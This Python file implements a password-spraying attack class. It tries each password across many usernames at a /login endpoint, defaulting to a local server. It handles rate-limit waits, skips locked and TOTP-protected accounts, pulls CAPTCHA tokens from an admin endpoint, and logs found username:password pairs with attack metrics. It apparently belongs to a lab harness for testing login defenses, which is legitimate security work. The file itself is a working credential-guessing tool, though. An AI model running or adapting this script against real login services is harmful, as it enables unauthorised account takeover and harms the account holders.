import requests
import time
from typing import List, Dict
from .metrics import AttackMetrics


class PasswordSprayAttack:
    def __init__(self, base_url="http://127.0.0.1:5000", group_seed=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.group_seed = group_seed

    def get_captcha_token(self):
        """Get a valid CAPTCHA token from the admin endpoint"""
        if not self.group_seed:
            raise ValueError("group_seed not provided, cannot get CAPTCHA token")
        try:
            response = self.session.get(
                f"{self.base_url}/admin/captcha_token",
                params={"group_seed": str(self.group_seed)},
                timeout=10,
            )
            if response.status_code == 200:
                data = response.json()
                return data.get("token")
            else:
                print(f"Failed to get CAPTCHA token: {response.status_code}")
                return None
        except Exception as e:
            print(f"Error getting CAPTCHA token: {e}")
            return None

    def attack(
        self,
        usernames: List[str],
        password_list: List[str],
        metrics: AttackMetrics,
        delay: float = 0.5,
        max_time: float = None,
    ) -> List[Dict[str, str]]:

        found_credentials = []
        compromised = set()
        attempt_i = 0

        metrics.start()
        start_time = time.time()

        for pwd_idx, password in enumerate(password_list, 1):
            print(f"Testing password '{password}' ({pwd_idx}/{len(password_list)})")

            amount = 0
            for username in usernames:
                if username in compromised:
                    continue

                if max_time and (time.time() - start_time) >= max_time:
                    metrics.stop()
                    return found_credentials

                attempt_i += 1
                attempt_start = time.time()
                need_captcha = False
                captcha_token_value = None

                while True:
                    try:
                        payload = {"username": username, "password": password}
                        if need_captcha and captcha_token_value:
                            payload["captcha_token"] = captcha_token_value

                        response = self.session.post(
                            f"{self.base_url}/login",
                            json=payload,
                            timeout=10,
                        )

                        latency = int((time.time() - attempt_start) * 1000)

                        if response.status_code == 429:  # ratelimit
                            retry_after = float(response.headers.get("Retry-After", 60))
                            time.sleep(retry_after)
                            metrics.record_attempt(False, latency)
                            break

                        if response.status_code == 403:
                            data = response.json()

                            if "locked" in data.get("error", ""):
                                compromised.add(username)
                                metrics.record_attempt(False, latency)
                                break

                            if data.get(
                                "captcha_required"
                            ) or "invalid_captcha" in data.get("error", ""):
                                need_captcha = True
                                captcha_token_value = self.get_captcha_token()
                                if captcha_token_value:
                                    continue

                            metrics.record_attempt(False, latency)
                            break

                        if response.status_code == 401:
                            print(f"TOTP enabled for {username}, skipping account")
                            compromised.add(username)
                            metrics.record_attempt(False, latency)
                            break

                        if response.status_code == 200:
                            data = response.json()
                            if data.get("success"):
                                found_credentials.append(
                                    {"username": username, "password": password}
                                )
                                compromised.add(username)
                                metrics.record_attempt(True, latency)
                                print(f"FOUND: {username}:{password}")
                            else:
                                metrics.record_attempt(False, latency)
                            break

                        metrics.record_attempt(False, latency)
                        break

                    except Exception:
                        metrics.record_attempt(False, 0)
                        break

                if metrics.attempts % 10 == 0:
                    metrics.sample_resources()

                if delay:
                    time.sleep(delay)

                amount += 1

            print(f"Tested on #{amount} usernames.")
        metrics.stop()
        return found_credentials
